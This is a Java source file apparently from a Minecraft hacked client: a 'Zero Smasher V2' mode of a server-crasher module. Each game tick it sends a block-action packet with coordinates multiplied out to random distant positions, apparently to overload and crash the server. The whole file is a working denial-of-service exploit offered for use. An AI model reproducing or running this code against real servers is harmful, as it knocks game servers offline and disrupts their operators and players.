package me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit.modes.servercrasher;

import de.florianmichael.dietrichevents2.DietrichEvents2;
import me.nekosarekawaii.foxglove.event.TickListener;
import me.nekosarekawaii.foxglove.feature.impl.module.ModuleMode;
import me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit.ServerCrasherModule;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.network.ClientPlayerInteractionManager;
import net.minecraft.client.world.ClientWorld;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import java.util.concurrent.ThreadLocalRandom;

public class ZeroSmasherV2ModuleMode extends ModuleMode<ServerCrasherModule> implements TickListener {

    public ZeroSmasherV2ModuleMode(final ServerCrasherModule parent) {
        super("Zero Smasher V2", parent);
    }

    @Override
    public void onEnable() {
        DietrichEvents2.global().subscribe(TickEvent.ID, this);
    }

    @Override
    public void onDisable() {
        DietrichEvents2.global().unsubscribe(TickEvent.ID, this);
    }

    @Override
    public void onTick() {
        final ClientWorld world = mc.world;
        final ClientPlayerEntity player = mc.player;
        final ClientPlayNetworkHandler networkHandler = mc.getNetworkHandler();
        final ClientPlayerInteractionManager interactionManager = mc.interactionManager;
        if (world == null || player == null || networkHandler == null || interactionManager == null) {
            this.getParent().setState(false);
            return;
        }
        final BlockPos playerPos = player.getBlockPos();
        final int
                x = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000),
                y = playerPos.getY(),
                z = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000);
        interactionManager.sendSequencedPacket(world, sequence -> new PlayerActionC2SPacket(
                PlayerActionC2SPacket.Action.ABORT_DESTROY_BLOCK,
                new BlockPos(x, y, z),
                Direction.DOWN,
                sequence
        ));
    }

}
